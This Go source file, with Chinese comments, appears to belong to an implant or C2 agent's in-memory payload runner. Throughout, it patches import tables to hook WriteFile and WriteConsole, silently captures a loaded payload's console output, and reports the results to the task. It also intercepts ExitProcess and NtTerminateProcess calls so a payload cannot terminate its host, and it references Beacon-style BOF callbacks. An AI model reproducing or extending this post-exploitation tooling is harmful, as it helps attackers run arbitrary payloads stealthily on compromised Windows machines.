// guardCaptureLimit 单条流（stdout / stderr 各算一条）的捕获上限。
const guardCaptureLimit = 256 * 1024

// guardStdioCapture 一次内存执行的输出捕获会话。
type guardStdioCapture struct {
	mu       sync.Mutex
	out      []byte
	err      []byte
	outTrunc bool
	errTrunc bool
	enable   bool
	note     string
	// 本次捕获期间"算作 stdout/stderr"的句柄值（写入点按句柄过滤）
	outHandles map[uintptr]bool
	errHandles map[uintptr]bool
}

var (
	guardCaptureMu   sync.Mutex
	guardCaptureLive *guardStdioCapture
)

// guardBeginStdioCapture 开始捕获：记录当前进程 std 句柄（CRT 缓存的就是这一对），
// 之后 WriteFile/WriteConsole 命中这些句柄的写入会被收进缓冲并"假装写成功"。
func guardBeginStdioCapture() *guardStdioCapture {
	c := &guardStdioCapture{
		outHandles: map[uintptr]bool{},
		errHandles: map[uintptr]bool{},
	}
	procGetStdHandle := resolveAPI("kernel32.dll", "GetStdHandle")
	if procGetStdHandle.resolved() == 0 {
		c.note = "stdout/stderr 捕获失败：GetStdHandle 不可用"
		return c
	}
	o, _, _ := procGetStdHandle.Call(uintptr(0xFFFFFFF5)) // STD_OUTPUT_HANDLE = -11
	e, _, _ := procGetStdHandle.Call(uintptr(0xFFFFFFF4)) // STD_ERROR_HANDLE  = -12
	if o != 0 {
		c.outHandles[o] = true
	}
	if e != 0 {
		c.errHandles[e] = true
	}
	// 两个伪句柄值也登记一下（个别 CRT 会把 GetStdHandle 的返回值直接透传/换算）
	c.outHandles[uintptr(0xFFFFFFF5)] = true
	c.errHandles[uintptr(0xFFFFFFF4)] = true
	c.enable = len(c.outHandles) > 0 || len(c.errHandles) > 0

	guardCaptureMu.Lock()
	guardCaptureLive = c
	guardCaptureMu.Unlock()
	guardTrace("capture: 开始（stdout 句柄 %d 个 / stderr 句柄 %d 个）", len(c.outHandles), len(c.errHandles))
	return c
}

// guardLiveCapture 取当前生效的捕获会话（无则 nil）。
func guardLiveCapture() *guardStdioCapture {
	guardCaptureMu.Lock()
	defer guardCaptureMu.Unlock()
	return guardCaptureLive
}

// stream 判断句柄属于哪条流：""=不捕获（原样放行）。
func (c *guardStdioCapture) stream(h uintptr) string {
	if c == nil || !c.enable {
		return ""
	}
	c.mu.Lock()
	defer c.mu.Unlock()
	if c.outHandles[h] {
		return "out"
	}
	if c.errHandles[h] {
		return "err"
	}
	return ""
}

// append 把一段字节收进对应流的缓冲（超上限就丢弃并打标记）。
func (c *guardStdioCapture) append(stream string, buf uintptr, n uintptr) {
	if c == nil || buf == 0 || n == 0 {
		return
	}
	if n > 1<<20 { // 单次写入超过 1 MiB 视为异常（控制台输出不会这么大）
		n = 1 << 20
	}
	chunk := (*[1 << 20]byte)(unsafe.Pointer(buf))[:n:n]
	c.mu.Lock()
	defer c.mu.Unlock()
	dst := &c.out
	trunc := &c.outTrunc
	if stream == "err" {
		dst = &c.err
		trunc = &c.errTrunc
	}
	if len(*dst) >= guardCaptureLimit {
		*trunc = true
		return
	}
	room := guardCaptureLimit - len(*dst)
	if uintptr(room) < n {
		*dst = append(*dst, chunk[:room]...)
		*trunc = true
		return
	}
	*dst = append(*dst, chunk...)
}

// End 结束捕获并把两条流解成 UTF-8 文本（拿不到内容时由调用方写成明确说明）。
func (c *guardStdioCapture) End(_ bool) (string, string, string) {
	guardCaptureMu.Lock()
	if guardCaptureLive == c {
		guardCaptureLive = nil
	}
	guardCaptureMu.Unlock()
	if c == nil {
		return "", "", "输出捕获未启用"
	}
	c.mu.Lock()
	outRaw := append([]byte(nil), c.out...)
	errRaw := append([]byte(nil), c.err...)
	outTrunc, errTrunc := c.outTrunc, c.errTrunc
	c.mu.Unlock()

	var notes []string
	if c.note != "" {
		notes = append(notes, c.note)
	}
	if outTrunc {
		notes = append(notes, fmt.Sprintf("stdout 超过 %d 字节上限，已截断", guardCaptureLimit))
	}
	if errTrunc {
		notes = append(notes, fmt.Sprintf("stderr 超过 %d 字节上限，已截断", guardCaptureLimit))
	}
	return guardDecodeConsole(outRaw), guardDecodeConsole(errRaw), strings.Join(notes, "；")
}

// guardHandleWriteFile 接管 WriteFile(hFile, lpBuffer, nBytes, lpWritten, lpOverlapped)。
// 只截流"当前 std 句柄"的写入（其它文件写入原样放行，绝不改变载荷的文件操作语义）。
func guardHandleWriteFile(hFile, lpBuffer, nBytes, lpWritten, lpOverlapped uintptr) uintptr {
	if c := guardLiveCapture(); c != nil {
		if stream := c.stream(hFile); stream != "" {
			c.append(stream, lpBuffer, nBytes)
			if lpWritten != 0 {
				*(*uint32)(unsafe.Pointer(lpWritten)) = uint32(nBytes)
			}
			return 1 // TRUE：对载荷而言"写成功了"，字节实际上被收进了回传缓冲
		}
	}
	orig := resolveAPI("kernel32.dll", "WriteFile").resolved()
	if orig == 0 {
		return 0
	}
	r, _, _ := syscall.SyscallN(orig, hFile, lpBuffer, nBytes, lpWritten, lpOverlapped)
	return r
}

// guardHandleWriteConsoleA 接管 WriteConsoleA(hConsole, lpBuffer, nChars, lpWritten, reserved)。
func guardHandleWriteConsoleA(hConsole, lpBuffer, nChars, lpWritten, reserved uintptr) uintptr {
	if c := guardLiveCapture(); c != nil {
		if stream := c.stream(hConsole); stream != "" {
			c.append(stream, lpBuffer, nChars)
			if lpWritten != 0 {
				*(*uint32)(unsafe.Pointer(lpWritten)) = uint32(nChars)
			}
			return 1
		}
	}
	orig := resolveAPI("kernel32.dll", "WriteConsoleA").resolved()
	if orig == 0 {
		return 0
	}
	r, _, _ := syscall.SyscallN(orig, hConsole, lpBuffer, nChars, lpWritten, reserved)
	return r
}

// guardHandleWriteConsoleW 接管 WriteConsoleW（宽字符）：按 UTF-16 读取后转 UTF-8 存进缓冲。
func guardHandleWriteConsoleW(hConsole, lpBuffer, nChars, lpWritten, reserved uintptr) uintptr {
	if c := guardLiveCapture(); c != nil {
		if stream := c.stream(hConsole); stream != "" {
			if lpBuffer != 0 && nChars > 0 && nChars < 1<<20 {
				ws := (*[1 << 20]uint16)(unsafe.Pointer(lpBuffer))[:nChars:nChars]
				utf8Bytes := utf16SliceToUTF8(ws)
				c.append(stream, uintptr(unsafe.Pointer(&utf8Bytes[0])), uintptr(len(utf8Bytes)))
			}
			if lpWritten != 0 {
				*(*uint32)(unsafe.Pointer(lpWritten)) = uint32(nChars)
			}
			return 1
		}
	}
	orig := resolveAPI("kernel32.dll", "WriteConsoleW").resolved()
	if orig == 0 {
		return 0
	}
	r, _, _ := syscall.SyscallN(orig, hConsole, lpBuffer, nChars, lpWritten, reserved)
	return r
}

// utf16SliceToUTF8 把 UTF-16 码元转成 UTF-8 字节（长为 0 时返回单字节，避免取 &b[0] 越界）。
func utf16SliceToUTF8(ws []uint16) []byte {
	if len(ws) == 0 {
		return []byte{0}
	}
	return []byte(windows.UTF16ToString(ws))
}

// guardDecodeConsole 把控制台工具的输出解成 UTF-8：
// 已经是合法 UTF-8 就原样返回；否则按 GBK 转（中文工具在中文 Windows 上默认输出 GBK）。
func guardDecodeConsole(raw []byte) string {
	if len(raw) == 0 {
		return ""
	}
	if utf8.Valid(raw) {
		return string(raw)
	}
	return string(gbkToUTF8(raw))
}

// ─── 结果回显 ───────────────────────────────────────────────────────────────

// guardHandleStubRecord 原生桩在改写退出之前调用的记录回调。
//
// 它**只记录、只返回**：这类"进 Go 再正常返回"的回调是安全的（BOF 的 BeaconPrintf
// 回调同理）；危险的只有"在 Go 回调里结束线程"（会掐掉一条 Go runtime 已接管的线程）。
func guardHandleStubRecord(code uintptr) uintptr {
	via := uint32(0)
	if guardStubData != 0 {
		via = *(*uint32)(unsafe.Pointer(guardStubData + guardStubSlotVia))
	}
	guardMu.Lock()
	guardStubHits++
	guardLastExit = guardExitEvent{
		code: int32(code),
		via:  guardViaName(via),
		tid:  guardCurrentThreadID(),
		at:   time.Now(),
	}
	if n := len(guardImages); n > 0 {
		guardLastExit.image = guardImages[n-1].base
	}
	guardMu.Unlock()
	guardTrace("桩命中: code=%d via=%s —— 记录后由**原生代码**改写为 ExitThread", int32(code), guardViaName(via))
	return 0
}

// guardExitStats 读"拦截了几次 / 最近一次的现场"。
// 主来源是原生桩里的记录回调；若回调因故没跑到，则退回读桩写下的数据槽。
func guardExitStats() (int, guardExitEvent) {
	guardMu.Lock()
	hits, last := guardStubHits, guardLastExit
	guardMu.Unlock()
	if hits == 0 && guardStubData != 0 {
		slotHits := int(*(*uint32)(unsafe.Pointer(guardStubData + guardStubSlotHit)))
		if slotHits > 0 {
			code := *(*int32)(unsafe.Pointer(guardStubData + guardStubSlotCode))
			via := *(*uint32)(unsafe.Pointer(guardStubData + guardStubSlotVia))
			last = guardExitEvent{code: code, via: guardViaName(via), tid: guardCurrentThreadID(), at: time.Now()}
			return slotHits, last
		}
	}
	return hits, last
}

// guardViaName 把 via 槽的编码翻成人话。
func guardViaName(via uint32) string {
	switch via {
	case guardViaExitProcess:
		return "kernel32!ExitProcess"
	case guardViaRtlExit:
		return "ntdll!RtlExitUserProcess"
	case guardViaTerminate:
		return "kernel32!TerminateProcess(GetCurrentProcess())"
	case guardViaNtTerminate:
		return "ntdll!NtTerminateProcess(GetCurrentProcess())"
	}
	return fmt.Sprintf("未知来源(%d)", via)
}

// guardPatchSummary 给任务结果用的一行人话摘要。
func guardPatchSummary(imageHits, moduleHits int) string {
	if !guardInstalled {
		reason := ""
		if guardStubBuildErr != nil {
			reason = "：" + guardStubBuildErr.Error()
		}
		return "加固未安装" + reason + "（载荷若调用 ExitProcess 仍会带走宿主，且无输出捕获）"
	}
	return fmt.Sprintf("加固已生效：退出拦截+输出捕获（镜像 IAT %d 处 / 已加载模块(CRT 等) IAT %d 处）",
		imageHits, moduleHits)
}

// guardFormatCaptured 把一次执行的捕获结果排版进任务结果。
// 明确区分三种情况，绝不用"空字符串"含糊过去：
//   - 捕获本身没启用/失败 → note 里就是原因；
//   - 启用了但没内容 → 列出可能原因；
//   - 有内容 → 分别给出 stdout / stderr 原文与字节数。
func guardFormatCaptured(stdoutText, stderrText, note string) string {
	var b strings.Builder
	b.WriteString("\n[输出捕获] ")
	if note != "" {
		b.WriteString(note)
	} else {
		b.WriteString("已接管 WriteFile/WriteConsole（按 std 句柄截流）")
	}
	if stdoutText == "" && stderrText == "" {
		b.WriteString("\n[输出捕获] 未捕获到任何内容（可能原因：该程序不往控制台写、输出发生在等待窗口之外、" +
			"或它用 WriteConsole 之外的 API 直接写控制台句柄）")
		return b.String()
	}
	if stdoutText != "" {
		b.WriteString(fmt.Sprintf("\n--- 载荷 stdout (%d 字节) ---\n%s", len(stdoutText), guardEnsureNewline(stdoutText)))
	}
	if stderrText != "" {
		b.WriteString(fmt.Sprintf("\n--- 载荷 stderr (%d 字节) ---\n%s", len(stderrText), guardEnsureNewline(stderrText)))
	}
	return b.String()
}

// guardEnsureNewline 保证捕获内容的末尾有换行（否则下一段标注会粘在输出后面）。
func guardEnsureNewline(s string) string {
	if strings.HasSuffix(s, "\n") {
		return s
	}
	return s + "\n"
}

// 保持 binary 包被引用（桩的字节序说明用）：所有立即数均按小端写入。
var _ = binary.LittleEndian
